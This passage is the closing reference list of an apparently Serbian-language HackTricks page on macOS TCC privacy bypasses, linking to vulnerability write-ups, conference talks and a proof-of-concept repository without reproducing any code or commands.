- [11] [Nova macOS ranjivost, „powerdir“, može dovesti do neovlašćenog pristupa korisničkim podacima](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/)
- [12] [Promena home direktorijuma i zaobilaženje TCC-a, odnosno CVE-2020-27937](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)
- [13] [Puštanje muzike i zaobilaženje TCC-a, odnosno CVE-2020-29621](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)
- [14] [Kako opljačkati (Fire)fox](https://wojciechregula.blog/post/how-to-rob-a-firefox/)
- [15] [CVE-2023-26818 - Zaobilaženje TCC-a pomoću Telegram-a u macOS-u](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
- [16] [Kandji - Otkrivanje Apple ranjivosti: Audit diskarbitrationd i storagekitd, 2. deo](https://www.kandji.io/blog/macos-audit-story-part2)
- [17] [Patrick Wardle - Objective by the Sea v2.0: Synthetic Clicks & CoreGraphics Event Taps](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf)
- [18] [breakpointHQ/TCC-ClickJacking - Proof of Concept](https://github.com/breakpointHQ/TCC-ClickJacking)
- [19] [Stack Overflow - Podešavanje environment promenljivih na OS X-u](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686)
- [20] [theevilbit - CVE-2020-9771: mount_apfs TCC bypass i escalation privilegija](https://theevilbit.github.io/posts/cve_2020_9771/)
- [21] [theevilbit - CVE-2021-30808: TCC bypass mountovanjem preko TCC baze podataka](https://theevilbit.github.io/posts/cve-2021-30808/)
- [22] [20+ načina za zaobilaženje macOS mehanizama privatnosti](https://www.youtube.com/watch?v=W9GxnP8c8FU)
- [23] [Pobeda nokautom protiv TCC-a - 20+ NOVIH načina za zaobilaženje mehanizama privatnosti na MacOS-u](https://www.youtube.com/watch?v=a9hsxPdRxsY)
{{#include ../../../../../banners/hacktricks-training.md}}
